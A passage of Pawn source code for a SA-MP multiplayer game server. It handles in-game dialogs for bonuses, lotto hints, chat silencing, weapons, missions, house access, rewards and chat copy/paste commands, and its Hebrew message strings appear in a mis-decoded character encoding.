					format(string,sizeof(string),"%s\n" @c(green) ".Єэ цр·, юЎрЁх ∙щ∙ ьъ юёЇщў ыёє ссЁў ыущ ьўЁх· р· фсхЁхё\n?фрэ р·ф юЄхЁщщя ь∙ьэ щ∙щ°х· у°ъ фыёє ∙ссЁў ∙ьъ",string);
					dia = dialog_cabonuspaybank;
				}
				return ShowPlayerDialog(playerid,dia,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· схЁхё ьЇЄщьх· Ў'рш",string,dia == dialog_ni ? ("OK") : ("ыя"),dia == dialog_ni ? ("") : ("ьр"));
			}
			GiveMoney(playerid,0-ChatActivityBonus[itsID][cabCost]);
			GiveChatActivityBonus(playerid,itsID);
		}
		case dialog_cabonuspaybank: if(response)
		{
			if(playerinfo[playerid][bank] < ChatActivityBonus[playerinfo[playerid][clickon]][cabCost]) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· схЁхё ьЇЄщьх· Ў'рш",@c(red) ".рЁчЁх ьр юшхюшющэ","OK","");
			UpdateBank(GetName(playerid)," ўЁщ· схЁхё ьЇЄщьх· Ў'рш",0-ChatActivityBonus[playerinfo[playerid][clickon]][cabCost]);
			GiveChatActivityBonus(playerid,playerinfo[playerid][clickon]);
		}
		case dialog_lottoquestion: if(response)
		{
			playerinfo[playerid][lottoquestion] = listitem;
			format(string,sizeof(string),@c(yellow) "%s",inputtext);
			ShowPlayerDialog(playerid,dialog_lottoquestion2,DIALOG_STYLE_INPUT,@c(lightblue) "сч° юёЇ° ь∙рьф",string,"·∙хсф","чцх°");
		}
		case dialog_lottoquestion2:
		{
			if(response)
			{
				new n = strval(inputtext);
				if(!strlen(inputtext) || n < 1 || n > 50) return ShowPlayerDialog(playerid,dialog_lottoquestion2,DIALOG_STYLE_INPUT,@c(lightblue) "сч° юёЇ° ь∙рьф",@c(red) ":юёЇ° ьр ·ўщя. Ёёф ьсчх° ∙хс","·∙хсф","чцх°");
				new bool:ans = !playerinfo[playerid][lottoquestion] ? (lottonum[0] < n) : (lottonum[0] > n);
				format(string,sizeof(string),@c(yellow) ":ф·∙хсф ь∙рьф - фрэ фюёЇ° ∙ь фьхшх %s юфюёЇ° %d\n{%s}%s",!playerinfo[playerid][lottoquestion] ? ("ўшя") : ("тухь"),n,HexStringOfColor(ans ? green : red),ans ? ("ыя") : ("ьр"));
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "·∙хсф ь∙рьф Єь фьхшх",string,"OK","");
			}
			else ShowPlayerConstDialog(playerid,dialog_lottoquestion);
		}
		case dialog_silence: if(response)
		{
			if(!IsPlayerMAdmin(playerid)) listitem++;
			new list[200];
			for(new i = 0; i < sizeof(SilenceTimes); i++) format(list,sizeof(list),!i ? ("%s[%02d:%02d] ф∙·ў ь%s") : ("%s\n[%02d:%02d] ф∙·ў ь%s"),list,SilenceTimes[i][silSeconds]/60,SilenceTimes[i][silSeconds]%60,SilenceTimes[i][silName]);
			if(playerinfo[playerid][silence][listitem] > 0) format(list,sizeof(list),"%s\n" @c(red) "фё° ф∙·ўф",list);
			format(string,sizeof(string),@c(lightblue) "Silence: %s",SilenceStrings[playerinfo[playerid][clickon] = listitem]);
			ShowPlayerDialog(playerid,dialog_silence2,DIALOG_STYLE_LIST,string,list,"ф∙·ў","чцх°");
			listitem--;
		}
		case dialog_silence2:
		{
			if(response)
			{
				if(listitem == sizeof(SilenceTimes))
				{
					playerinfo[playerid][silence][playerinfo[playerid][clickon]] = 0;
					SendClientMessage(playerid,green," :фф∙·ўф ЁЄЎ°ф Єсх°");
				}
				else
				{
					playerinfo[playerid][silence][playerinfo[playerid][clickon]] = SilenceTimes[listitem][silSeconds];
					format(string,sizeof(string)," :ф∙·ўф схЎЄф сфЎьчф ью∙ъ %s Єсх°",SilenceTimes[listitem][silName]);
					SendClientMessage(playerid,green,string);
				}
				SendClientMessage(playerid,white,SilenceStrings[playerinfo[playerid][clickon]]);
			}
			else ShowPlayerConstDialog(playerid,dialog_silence2);
		}
		case dialog_cmdmelee, dialog_cmdgun:
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фхьъ °ть");
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			new tl = GetPlayerTeleportArea(playerid);
			if(tl > -1 && Teleports[tl][Tnoshooting]) return SendClientMessage(playerid,red," .рёх° ьф∙·ю∙ сЁ∙ўщэ с∙щтх° фцф");
			if(CheckIfCommandUsed(playerid,10,true)) return 1;
			GiveWeapon(playerid,dialogid == dialog_cmdmelee ? (listitem+1) : Ammunation[listitem][aID],dialogid == dialog_cmdmelee ? 0 : Ammunation[listitem][aAmmo]);
			format(string,sizeof(string)," !%s ўщсь·",inputtext);
			SendClientMessage(playerid,green,string);
		}
  		case dialog_missions: if(response)
		{
		    new msid = (listitem);
			if(missions[msid] == true) return SendClientMessage(playerid,red," .ющ∙фх ыс° Єх∙ф р· фю∙щюф фцр·, рЁр фю·я");
			playerinfo[playerid][mission] = msid;
			for(new x; x < MAX_MISSION_TARGETS; x++) playerinfo[playerid][mlpickup][x] = 0;
			for(new i = 0; i < sizeof(MissionsInfo); i++) if(MissionsInfo[i][msID] == msid)
			{
				format(string,sizeof(string)," ~~~ ф·чь· р· %s: ~~~",MissionsInfo[i][msName]);
				SendClientMessage(playerid,lightblue,string);
				playerinfo[playerid][mvehicle] = CreateVehicle(MissionsInfo[i][msVehicle],MissionsInfo[i][msPos][0],MissionsInfo[i][msPos][1],MissionsInfo[i][msPos][2],MissionsInfo[i][msPos][3],250,0,-1);
                PutPlayerInVehicle(playerid,playerinfo[playerid][mvehicle],0);
				SetPlayerCameraPos(playerid,MissionsInfo[i][msCamera][0],MissionsInfo[i][msCamera][1],MissionsInfo[i][msCamera][2]);
				SetPlayerCameraLookAt(playerid,MissionsInfo[i][msPos][0],MissionsInfo[i][msPos][1],MissionsInfo[i][msPos][2]);
				break;
			}
			missions[msid] = true;
			SendClientMessage(playerid,yellow," .ф·чь· р· фю∙щюф сфЎьчф, юш°·ъ фщр ьфЄсщ° р· фю∙ьхч ьыь фщЄущэ ∙юхЇщЄщэ сюЇф");
			format(string,sizeof(string)," %d$ сющуф х·Ўьщч сю∙щюф х·Єсщ° р· ыь фю∙ьхчщэ ·ўсь",MissionsInfo[playerinfo[playerid][mission]][msMoney]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,yellow," !ь°∙х·ъ 7 хчЎщ уўх· Єьщъ ьЄ∙х· цр· сюфщ°х· хьфтщЄ ьщЄу сцюя, сфЎьчф");
			SetVehicleVirtualWorld(playerinfo[playerid][mvehicle],world_missions);
			SetPlayerVirtualWorld(playerid,world_missions);
			SetPlayerInterior(playerid, 0);
            SetFreeze(playerid,1), playerinfo[playerid][mstime] = 5;
		}
		case dialog_house: if(response && playerinfo[playerid][houseid] != -1)
		{
		    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
			new own[64], h = playerinfo[playerid][houseid], id = -1;
			format(own,sizeof(own),"/DM/Houses/%d.ini",h);
			format(own,sizeof(own),fgetstring(own,"Owner"));
			for(new i = 0; i < MAX_PLAYERS_ && id == -1; i++) if(IsPlayerConnected(i) && equal(GetName(i),own)) id = i;
			if(id == playerid) ShowPlayerConstDialog(playerid,dialog_housemenu);
			else
			{
				if(equal(own,"None")) command(playerid,"/buyhouse");
				else
				{
					if(playerinfo[playerid][houseacc][h]) GoIntoHouse(playerid,h);
					else ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(red) "ыЁщёф ьсщ·",@c(red) ".рщя ьъ тщ∙ф ьфыЁё ьсщ· фцф","OK","");
				}
			}
		}
		case dialog_housemenu: if(response && playerinfo[playerid][houseid] != -1)
		{
		    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
			new h = playerinfo[playerid][houseid];
			playerinfo[playerid][clickon] = listitem;
			switch(listitem)
			{
				//"ыЁщёф ьсщ·\n∙щтх° фсщ·\nфхёЇ· тщ∙ф ь∙чўя\nфё°· тщ∙ф ю∙чўя ючхс°\nфё°· тщ∙ф ь∙чўя ьр ючхс°\n°∙щю· сЄьщ фтщ∙х· ьсщ·\nрщЇхё ыь сЄьщ фтщ∙х· ьсщ·\nючщў· фсщ·\n"@c(red)"(/House Tele :ыущ ь∙Ёх· р· ф∙щтх° ьсщ· ф∙·ю∙ сЇўхуф)","счщ°ф","щЎщрф");
				case 0: // get in
				{
					GoIntoHouse(playerid,h);
				}
				case 1: // teleport
				{
					command(playerid,"/h");
				}
				case 2: // add acc
				{
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· тщ∙х· ьсщ·",@c(grey) ":°∙хэ ыря р· фрщщущ рх фыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф " @c(green) "ьфхёщє" @c(grey) " ьх тщ∙х· ьсщ· ∙ьъ","фхёЇф","сщшхь");
				}
				case 3: // remove acc
				{
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_INPUT,@c(lightblue) "фх°у· тщ∙х· ьсщ·",@c(grey) ":°∙хэ ыря р· фрщщущ рх фыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф " @c(red) "ьфх°щу" @c(grey) " ьх тщ∙х· ьсщ· ∙ьъ","фхёЇф","сщшхь");
				}
				case 4: // remove acc (offline)
				{
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_INPUT,@c(lightblue) "фх°у· тщ∙х· ьсщ·",@c(grey) ":°∙хэ ыря р· фыщЁхщ фюухщщў ∙ь ф∙чўя ∙р·ф °хЎф " @c(red) "ьфх°щу" @c(grey) " ьх тщ∙х· ьсщ· ∙ьъ","фхёЇф","сщшхь");
				}
				case 5: // list
				{
					new accs = 0, dia[800], fl[64];
					dia = @c(yellow);
					format(fl,sizeof(fl),"/DM/Houses/%d.ini",h);
					for(new i = 0; i < max_houseacc; i++)
					{
						format(string,sizeof(string),"Acc%d",i);
						if(!fkeyexist(fl,string)) if(i == max_houseacc-1) break; else continue;
						format(dia,sizeof(dia),"%s\n%d) %s",dia,++accs,fgetstring(fl,string));
					}
					if(!accs) return dia = @c(red) "!рщя сЄьщ тщ∙х· ьсщ· ∙ьъ";
					format(dia,sizeof(dia),"\n\n" @c(green) "- ёъ фыь %d ю∙·ю∙щэ сЄьщ тщ∙ф",accs);
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· сЄьщ тщ∙х· ьсщ·",dia,"чц°ф","");
				}
				case 6: // reset
				{
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_MSGBOX,@c(lightblue) "рщЇхё тщ∙х· ьсщ·",@c(grey) "?фрэ р·ф сшхч ∙р·ф °хЎф ьрЇё р· ыь °∙щю· сЄьщ фтщ∙х· ьсщ· ∙ьъ\n" @c(red) ".ьр щфщф Ёщ·я ь∙чц° рх·ф","ыя","ьр");
				}
				case 7: // delete
				{
					ShowPlayerDialog(playerid,dialog_housemenu2,DIALOG_STYLE_MSGBOX,@c(lightblue) "ючщў· фсщ·",@c(grey) "?фрэ р·ф сшхч ∙р·ф °хЎф ьючхў р· фсщ· ∙ьъ\n" @c(red) ".ьр щхчц° ьъ ыёє Єь фсщ·, хфхр ьр щфщф ∙щщъ ьъ щх·°","ыя","ьр");
				}
			}
		}
		case dialog_housemenu2:
		{
		    if(playerinfo[playerid][admin] != 20) return SendClientMessage(playerid, red, " .юЄ°ы· цх Ёчёюф х·Єьф сў°хс ь∙°·");
			if(response)
			{
				switch(playerinfo[playerid][clickon])
				{
					case 2: // add acc
					{
						format(string,sizeof(string),"/house giveacc %s",inputtext);
						command(playerid,string);
					}
					case 3: // remove acc
					{
						format(string,sizeof(string),"/house removeacc %s",inputtext);
						command(playerid,string);
					}
					case 4: // remove acc (offline)
					{
						format(string,sizeof(string),"/house nremoveacc %s",inputtext);
						command(playerid,string);
					}
					case 6: // reset
					{
						command(playerid,"/house removeallacc");
					}
					case 7: // delete
					{
						command(playerid,"/house delete");
					}
				}
				playerinfo[playerid][clickon] = -1;
			}
			ShowPlayerConstDialog(playerid,dialog_housemenu);
		}
		/*case dialog_house:
		{
		    if(listitem == 1)
		    {
				new keys[M_S], fi[M_S];
				format(string,sizeof(string),@c(green) "[+] (Ё·щЁ· юЇ·ч ь∙чўя (1,500$\n");
				format(fi,sizeof(fi),"%s%d.ini",folder_houses,playerinfo[playerid][houseid]);
				for(new _i = 0; _i < MAX_HOUSE_KEYS; _i++)
				{
				    format(keys,sizeof(keys),"Acc%d",_i);
				    if(!fkeyexist(fi,keys)) if(_i == MAX_HOUSE_KEYS-1) break; else continue;
					format(string,sizeof(string),@c(white) "%s" @c(grey)"Х " @c(white) "%s\n",string,fgetstring(fi,keys));
				}
				ShowPlayerDialog(playerid,dialog_keys,DIALOG_STYLE_LIST,@c(lightblue)"юЇ·чх· фсщ·",string,"рщ∙х°","чц°ф");
		    }
		}
		case dialog_furnitures:
		{
		    new list[350];
		    format(string,sizeof(string),@c(lightblue) "%s",FurnituresCategoriesInfo[listitem][hcName]);
		    playerinfo[playerid][fpage] = listitem;
		    for(new _i = 0; _i < 62; _i++) if(HouseFurnituresCategories[_i][hcsID] == listitem) format(list,sizeof(list),"%s%s\n",list,HouseFurnituresCategories[_i][hcsSubname]);
		    ShowPlayerDialog(playerid,dialog_subfurnitures,DIALOG_STYLE_LIST,string,list,"ыЁщёф","сщшхь");
		}
		case dialog_subfurnitures:
		{
		    new list[750];
		    for(new _i = 0; _i < 777; _i++) if(HouseFurnitures[_i][fCategory] == playerinfo[playerid][fpage] && HouseFurnitures[_i][fSubCategory] == listitem)
		    {
		        format(list,sizeof(list),"%s" @c(grey) "Х " @c(white) "%s - (" @c(green) "%d$ " @c(white) ")\n",list,HouseFurnitures[_i][fName],HouseFurnitures[_i][fCost]);
		    }
		    ShowPlayerDialog(playerid,dialog_fitems,DIALOG_STYLE_LIST,@c(lightblue) "Furnitures - °фщшщэ",list,"°ыщ∙ф","щЎщрф");
		}
		case dialog_keys:
		{
		    if(!response) return command(playerid,"/house");
			if(listitem == 0) return ShowPlayerDialog(playerid,dialog_givekey,DIALOG_STYLE_INPUT,@c(lightblue)"Ё·щЁ· юЇ·ч",@c(white)"фўьу рщщущ/∙э ∙ь ∙чўя ∙с°ЎхЁъ ь·· ьх юЇ·ч ьсщ· ∙ьъ\n" @c(grey) ".∙щэ ьс: ф∙чўя щыхь ьсчх° рэ ьўсь р· фюЇ·ч хсющуф хфхр схч° ∙ьр ьўсь р· фюЇ·ч фыёє ьр Ёьўч ююъ","рщ∙х°","щЎщрф");
			else if(listitem != 0)
			{
			    new keyline[M_S];
			    format(f,sizeof(f),"%s%d.ini",folder_houses,playerinfo[playerid][houseid]);
			    format(keyline,sizeof(keyline),"Acc%d",playerinfo[playerid][takekey] = (listitem - 1));
				format(string,sizeof(string),@c(green)"?%s фрэ р·ф юЄхЁщщя ьўч· р· юЇ·чх· фсщ· ∙ьъ ю",fgetstring(f,keyline));
				ShowPlayerDialog(playerid,dialog_getkey,DIALOG_STYLE_MSGBOX,@c(lightblue)"юЇ·чх· фсщ·",string,"рщ∙х°","сщшхь");
			}
		}
		case dialog_givekey:
		{
		    if(GetMoney(playerid) < 1500) return SendClientMessage(playerid,red," 1500$ ёыхэ фыёє фу°х∙ ьчьхў· юЇ·ч ьсщ· ∙ьъ фхр");
			new id = ReturnUser(inputtext,playerid);
			if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			format(f,sizeof(f),"%s%d.ini",folder_houses,playerinfo[playerid][houseid]);
			for(new _i = 0; _i < MAX_HOUSE_KEYS; _i++)
			{
			    format(string,sizeof(string),"Acc%d",_i);
				if(equal(fgetstring(f,string),GetName(_i)))
				{
				    SendClientMessage(playerid,red," .ь∙чўя цф ыс° щ∙ юЇ·ч ьсщ· ∙ьъ");
				    break;
				}
			}
			format(string,sizeof(string)," /accept :°хЎф ьфсщр ьъ юЇ·ч ьсщ· ∙ьх, сющуф хр·ф °хЎф ьўсь р· фюЇ·ч фўьу р· фЇўхуф %s",GetName(playerid));
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," ...юЇ·ч ьсщ· ∙ьъ, рЁр фю·я ь·∙хс·х %s фЎЄ· ь",GetName(id));
			SendClientMessage(playerid,green,string);
		}
		case dialog_getkey:
		{
		    if(!response) return 1;
		    new substring[M_S];
		    format(f,sizeof(f),"%s%d.ini",folder_houses,playerinfo[playerid][houseid]);
		    format(string,sizeof(string),"Acc%d",playerinfo[playerid][takekey]);
		    format(substring,sizeof(substring)," .р· фюЇ·ч ∙ь фсщ· ∙ьъ, ыЄ· рщя ьх тщ∙ф Єсх° сщ·ъ %s ьўч· ю",fgetstring(f,string));
		    SendClientMessage(playerid,green,substring);
			format(substring,sizeof(substring),"%s",fgetstring(f,string));
			for(new _i = 0; _i < MAX_PLAYERS_; _i++) if(IsPlayerConnected(_i) && equal(GetName(_i),substring))
			{
			    format(substring,sizeof(substring)," .ьўч ююъ р· фюЇ·ч ∙ь фсщ· ∙ьх, ыЄ· рщя ьъ тщ∙ф ьсщ·х %s",GetName(playerid));
			    SendClientMessage(_i,green,substring);
			    break;
			}
		}*/
		case dialog_rewards: if(response && playerinfo[playerid][logged]) switch(listitem)
		{
			case 0:
			{
				if(Reward_Check(playerid,"SpawnMoney")) ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",@c(red) ".ыс° ю∙ы· р· ёыхэ фыёє фщхющ ьфщхэ","чцх°","ётх°");
				else
				{
					Reward_Give(playerid,"SpawnMoney");
					GiveMoney(playerid,spawnmoney,1);
					ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",@c(green) ".ю∙ы· р· ёыхэ фыёє фщхющ Єь ёъ " #spawnmoney "$","OK","");
				}
			}
			case 1:
			{
				new td[3];
				getdate(td[0],td[1],td[2]);
				new wkday = weekday(td[2],td[1],td[0]);
				if(wkday != 0 && wkday != 6)
				{
					format(string,sizeof(string),@c(red) ".(фщхэ щхэ %s, ·хыь ьсЎЄ р· фЇўхуф фцх сёхЇ\"∙ (∙щ∙щ рх ∙с·",GetDay(td[0],td[1],td[2],1));
					ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",string,"чцх°","ётх°");
				}
				else
				{
					if(Reward_Check(playerid,"Weekend")) ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",@c(red) ".ыс° ю∙ы· р· ёыхэ фыёє ∙ь фёхЇ\"∙ ьфщхэ","чцх°","ётх°");
					else
					{
						Reward_Give(playerid,"Weekend");
						GiveMoney(playerid,weekendmoney,1);
						ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",@c(green) ".ю∙ы· р· ёыхэ фыёє фщхющ ьёхЇ\"∙ Єь ёъ " #weekendmoney "$","OK","");
					}
				}
			}
			case 2:
			{
				printf("claim start");
				new claim = fgetint(fuser(playerid),"Claim"), fu[128];
				printf("claim = %d",claim);
				if(claim == -1) return ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ", @c(red) ".ю∙·ю∙ цф рщЁх цырщ ьўсь· ыёє ют°ё·х фўхую· ∙ь фюху","чцх°","ётх°");
				format(fu,sizeof(fu),folder_infoco "%s.txt",GetName(playerid));
				printf("f = %s",f);
				if(!fexist(fu)) return ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ", @c(red) " .ф·°ч∙ф сЄщф. рЁр ЇЁф рь ффЁфь· ф∙°· сющуф хр·ф цырщ ьўсь· ыёє","чцх°","ётх°");
				new File:fh, read[256], dia[2048];
				fh = fopen(fu,io_read);
				if(fh)
				{
					printf("dia = %s",dia);
					while(fread(fh,read)) if(read[0] != ';' && strfind(read,"=") == -1) format(dia,sizeof(dia),@c(yellow) "%s%s",dia,read);
					printf("dia = %s",dia);
					fixchars(dia);
					fclose(fh);
					printf("fclose");
					strcat(dia,@c(white) "\n\n :ы°тЄ р·ф цырщ ьўсь· ёыхэ ыёє сёъ\n"@c(white));
					if(claim < 1) strcat(dia," .ыь фыёє Ёьўч");
					else
					{
						format(string,sizeof(string)," $%d\nХ :ью∙щы· фыёє фўьу р· фёыхэ ф°Ўхщ с·щсф фсрф",claim);
						strcat(dia,string);
					}
					ShowPlayerDialog(playerid,dialog_rewards_com,claim < 1 ? DIALOG_STYLE_MSGBOX : DIALOG_STYLE_INPUT,@c(lightblue) "цырх· ьЇ°ёщэ",dia,claim < 1 ? ("чцх°") : ("ю∙щыф"),"щЎщрф");
				}
			}
		}
		case dialog_rewards2: if(response && playerinfo[playerid][logged]) ShowPlayerConstDialog(playerid,dialog_rewards);
		case dialog_rewards_com: if(response && playerinfo[playerid][logged])
		{
			new claim = fgetint(fuser(playerid),"Claim");
			if(claim < 1) ShowPlayerConstDialog(playerid,dialog_rewards);
			else
			{
			    new val = strval(inputtext);
			    if(val < 1 || val > 99999999) return ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",@c(red) " .ёыхэ ыёє ∙тхщ","чцх°","ётх°");
			    if(val > claim)
			    {
			        format(string,sizeof(string)," .р·ф цырщ ьЄху %d$, ьр Ёщ·я ью∙хъ р· ёыхэ фыёє ∙сщў∙·",claim);
			        return ShowPlayerDialog(playerid,dialog_rewards2,DIALOG_STYLE_MSGBOX,@c(lightblue) "цырх· ьЇ°ёщэ",string,"чцх°","ётх°");
			    }
			    fsetint(fuser(playerid),"Claim",claim - val);
			    if(!claim) format(string,sizeof(string),@c(green) " .ю∙ы· р· ыь ёыхэ фыёє ∙Ёх·° ью∙щыф ($%d) хфхр ЁыЁё рхшхюшщ· ьч∙схя фсЁў ∙ьъ",val);
			    else
				{
					format(string,sizeof(string),@c(green) " .ю∙ы· сёф\"ы $%d ∙ЁыЁёх рхшхюшщ· ьч∙схя фсЁў ∙ьъ",val);
					format(string,sizeof(string),"%s\n .Ёх·°х ьъ Єху $%d ью∙щыф",string,claim-val);
				}
			    if(playerinfo[playerid][bank] >= levels[playerinfo[playerid][level]][BankLimit])
				{
					format(string,sizeof(string),"%s\n\n" @c(red) "!∙щэ ьс ∙ёыхэ фыёє сч∙схя фсЁў ∙ьъ Єхўє р· ютсь· ф°юф",string);
					format(string,sizeof(string),"%s\n" @c(red) ".цф рхю° ∙Єьщъ ьЁЎь р· фёыхэ ∙фхЎр· Єы∙щх, ыщ рэ ·Ўр юф∙°· ы∙ЄўЇ· р· фютсьф, фёыхэ щЄьэ",string);
				}
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ю∙щы· ыёє юфт°ёф фўхую· ∙ь фюху",string,"OK","");
			    UpdateBank(GetName(playerid)," ўщсь· ыёє юфт°ёф фўхую· ∙ь фюху",val);
			    format(string, sizeof(string), "withdraw: %d, left: %d", val, claim - val);
			    Log("Claim", playerid, string);
			}
		}
		default: return 0;
	}
	#if lagtest
		format(string,sizeof(string),"Dialog %s %d %d %d %s",GetName(playerid),dialogid,response,listitem,inputtext);
		LagTest_End(string);
	#endif
	return 1;
}
//=[OnPlayerClickPlayer]========================================================
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	#if lagtest
		LagTest_Start("OnPlayerClickPlayer");
	#endif
	if(source == CLICK_SOURCE_SCOREBOARD)
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ф·чь ь∙чў ьЇЁщ ∙·ьчї Єь ∙чўЁщэ");
		new string[M_S];
		switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank:
			{
				format(string,sizeof(string)," %s // юЄ°ы· сЁў",GetName(clickedplayerid));
				ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,"фЄс° ыёє\nфхЎр ыёє юфсЁў ∙ь ю∙·ю∙ цф\nсухў р· ыюх· фыёє ∙ь ю∙·ю∙ цф","сч°","ётх°");
			}
			default:
			{
				if(playerid == clickedplayerid) ShowPlayerConstDialog(playerid,dialog_border_me);
				else
				{
					format(string,sizeof(string)," %s // рЇ∙°хщх· ∙чўя",GetName(clickedplayerid));
					ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,IsPlayerMAdmin(playerid) ? ("Stats\nPM\nReport\nPay\nProfile\nAdmin...") : ("Stats\nPM\nReport\nPay\nProfile"),"сч°","ётх°");
				}
			}
		}
		playerinfo[playerid][clickplayer] = clickedplayerid;
	}
	#if lagtest
		LagTest_End("OnPlayerClickPlayer");
	#endif
	return 1;
}
//=[OnPlayerChatCommand]========================================================
public OnPlayerChatCommand(playerid,cmdtext[])
{
	new cmd[256], idx;
	cmd = strtok(cmdtext,idx);
	if(equal(cmd,"&help") || equal(cmd,"&cmd"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :Їўхух· Ў'рш ~~~");
		SendClientMessage(playerid,yellow," &help / &cmd - ф·Ї°щш фцф");
		SendClientMessage(playerid,yellow," &copy - фЄ·ў· ффхуЄф фрч°хЁф юфЎ'рш");
		SendClientMessage(playerid,yellow," &paste - фусў· ффхуЄф ∙фЄ·ў·");
		SendClientMessage(playerid,yellow," &chars - °∙щю· ·хщэ ющхчущэ");
		return 1;
	}
	if(equal(cmd,"&copy"))
	{
		if(strlen(lastChatText) > 180) return SendClientMessage(playerid,red," .ффхуЄф фрч°хЁф ∙Ё°∙юф сЎ'рш р°хыф юущ");
		if(!strlen(lastChatText)) return SendClientMessage(playerid,red," .ьр Ё°∙юф ∙хэ фхуЄф сЎ'рш / фрующя Ёщўф р· фЎ'рш, ьыя ьр Ёщ·я ьфЄ·щў");
		format(playerinfo[playerid][copytext],200,lastChatText);
		SendClientMessage(playerid,green," :фЄ·ў· р· фшўёш фср");
		SendClientMessage(playerid,white,lastChatText);
		SendClientMessage(playerid,green," &paste ьфусўф °∙хэ");
		return 1;
	}
	if(equal(cmd,"&paste"))
	{
		if(!strlen(playerinfo[playerid][copytext])) return SendClientMessage(playerid,red," .ьр фЄ·ў· ∙хэ фхуЄф");
		SendClientMessage(playerid,green," :фшўёш ∙фЄ·ў· фхусў сЎ'рш");
		OnPlayerText(playerid,playerinfo[playerid][copytext]);
		return 1;
	}
	if(equal(cmd,"&chars"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :рЇ∙°хщх· Ў'рш ~~~");
		format(cmd,sizeof(cmd)," 1) рчхц = %s","%%");
		SendClientMessage(playerid,yellow,cmd);
		for(new i = 0; i < sizeof(chatKeywords); i++)
		{
			format(cmd,sizeof(cmd)," %d) %s = %s",i+2,chatKeywords[i][ckWord],chatKeywords[i][ckReplaceTo]);
			SendClientMessage(playerid,yellow,cmd);
		}
		return 1;
	}
	return 0;
}
//=[OnPlayerEnterDynamicArea]===================================================
public OnPlayerEnterDynamicArea(playerid,areaid)
{
	#if lagtest
		LagTest_Start("OnPlayerEnterDynamicArea");
	#endif
	new string[M_S];
	switch(areainfo[areaid][areatype])
	{
		case area_hq:
		{
			playerinfo[playerid][inhq] = areainfo[areaid][areaparam];
			if(playerinfo[playerid][teleportedhq]) playerinfo[playerid][teleportedhq] = 0;
			else
			{
				new c = areainfo[areaid][areaparam];
				format(string,sizeof(string)," (юёЇ° юЇўуф: #%d) !%s с°хыщэ фсрщэ ьюЇўу· фўьря", areainfo[areaid][areaparam], claninfo[c][cname]);
				SendClientMessage(playerid,rgba2hex(claninfo[c][ccolor][0],claninfo[c][ccolor][1],claninfo[c][ccolor][2],255),string);
				if(claninfo[c][cruler] != c && claninfo[claninfo[c][cruler]][cvalid])
				{
					format(string,sizeof(string)," .%s юЇўуф цх Ё∙ьш· ы°тЄ Єь щущ фўьря",claninfo[claninfo[c][cruler]][cname]);
					SendClientMessage(playerid,rgba2hex(claninfo[claninfo[c][cruler]][ccolor][0],claninfo[claninfo[c][cruler]][ccolor][1],claninfo[claninfo[c][cruler]][ccolor][2],255),string);
				}
				if(claninfo[c][cruler] == c && claninfo[c][csystems][clansys_security] && playerinfo[playerid][clan] != c && !claninfo[c][cpeace][playerinfo[playerid][clan]] && !playerinfo[playerid][securitydelay] && !playerinfo[playerid][spectate])
				{
					if(!playerinfo[playerid][clan]) format(string,sizeof(string)," !Їхь∙ ьюЇўуф ∙ьъ ы°тЄ %s",GetName(playerid));
					else format(string,sizeof(string)," !Їхь∙ ьюЇўуф ∙ьъ ы°тЄ %s юфўьря %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
